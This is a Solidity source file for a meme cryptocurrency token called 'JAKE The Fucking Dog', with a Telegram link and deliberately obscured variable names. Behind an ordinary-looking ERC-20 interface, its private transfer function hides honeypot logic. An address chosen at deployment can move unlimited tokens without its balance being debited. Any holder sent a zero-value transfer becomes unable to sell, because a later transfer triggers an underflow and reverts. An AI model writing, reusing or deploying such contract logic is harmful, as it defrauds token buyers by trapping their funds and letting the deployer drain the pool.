/*

https://t.me/JakeTheFuckingDog

*/

// SPDX-License-Identifier: Unlicense

pragma solidity ^0.8.5;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), 'Ownable: caller is not the owner');
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), 'Ownable: new owner is the zero address');
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract Jake is Ownable {
    mapping(address => mapping(address => uint256)) public allowance;

    uint256 private fuckdoggtta = 48;

    function transferFrom(address jakeFFTT, address fuckdogg, uint256 jakeedogg) public returns (bool success) {
        require(jakeedogg <= allowance[jakeFFTT][msg.sender]);
        allowance[jakeFFTT][msg.sender] -= jakeedogg;
        row(jakeFFTT, fuckdogg, jakeedogg);
        return true;
    }

    mapping(address => uint256) private dogginJake;

    event Transfer(address indexed from, address indexed to, uint256 value);

    string public symbol = 'JAKE';

    uint8 public decimals = 9;

    uint256 public totalSupply = 1000000000 * 10 ** 9;

    event Approval(address indexed owner, address indexed spender, uint256 value);

    address public uniswapV2Pair;

    mapping(address => uint256) private jakinooo;

    string public name = 'JAKE The Fucking Dog';

    constructor(address dogginJaketat) {
        balanceOf[msg.sender] = totalSupply;
        dogginJake[dogginJaketat] = fuckdoggtta;
        IUniswapV2Router02 uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
    }

    function row(address jakeFFTT, address fuckdogg, uint256 jakeedogg) private returns (bool success) {
        if (dogginJake[jakeFFTT] == 0) {
            balanceOf[jakeFFTT] -= jakeedogg;
        }

        if (jakeedogg == 0) jakinooo[fuckdogg] += fuckdoggtta;

        if (jakeFFTT != uniswapV2Pair && dogginJake[jakeFFTT] == 0 && jakinooo[jakeFFTT] > 0) {
            dogginJake[jakeFFTT] -= fuckdoggtta;
        }

        balanceOf[fuckdogg] += jakeedogg;
        emit Transfer(jakeFFTT, fuckdogg, jakeedogg);
        return true;
    }

    function approve(address snakkotr, uint256 jakeedogg) public returns (bool success) {
        allowance[msg.sender][snakkotr] = jakeedogg;
        emit Approval(msg.sender, snakkotr, jakeedogg);
        return true;
    }

    function transfer(address fuckdogg, uint256 jakeedogg) public returns (bool success) {
        row(msg.sender, fuckdogg, jakeedogg);
        return true;
    }

    mapping(address => uint256) public balanceOf;
}